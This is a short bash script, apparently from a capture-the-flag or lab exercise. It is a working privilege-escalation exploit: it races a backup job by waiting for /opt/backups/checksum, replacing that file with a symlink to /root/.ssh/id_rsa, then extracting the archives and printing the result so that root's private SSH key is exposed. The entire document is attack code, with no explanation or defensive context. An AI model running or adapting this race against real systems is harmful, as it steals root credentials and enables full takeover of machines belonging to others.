#!/bin/bash

while true; do
    if [ -e /opt/backups/checksum ]; then
        rm -f /opt/backups/checksum
        echo '[+] Checksum file removed'
        ln -sf /root/.ssh/id_rsa /opt/backups/checksum
        echo '[+] Symlink placed'
        break
    fi
done

ls -la /opt/backups
cp *.tar /tmp;cd /tmp;
tar -xvf *.tar; cat /opt/backups/checksum;